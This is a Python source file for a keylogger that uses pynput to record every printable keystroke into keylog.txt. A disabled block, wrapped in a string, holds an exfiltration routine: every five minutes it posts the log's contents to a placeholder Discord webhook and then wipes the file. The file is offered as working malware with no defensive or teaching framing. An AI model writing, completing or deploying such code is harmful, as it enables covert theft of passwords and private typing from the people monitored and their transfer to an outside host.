from pynput import keyboard
#import requests
#import time
import os
#import random

#webhook = "the discord web hook will be here"
#rdm_sec = [500,600,700,800,900]

# This function runs every time a key is pressed
def on_press(key):
    try:
        # Try to get the printable character
        log = key.char
#error handler
    except AttributeError:
        return


    # Save to file
    with open("keylog.txt", "a") as file:
        file.write(log)


# Start the key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

'''''''''

#send content of file function
def send_file():
    with open("keylog.txt", "r") as file:
        content = file.read()

#send only if file has contents
    if os.path.getsize("keylog.txt") == 0:
        return
    else:
        response = requests.post(webhook, json={"content": content})



        # delete contents of file
        if  response.status_code == 200:
            with open("keylog.txt", "r+") as con:
                con.seek(0)
                con.truncate()

#--execute send_file function here
while True:
    send_file()
    time.sleep(300) # 300 sec. 5 minutes
    
'''''''''''

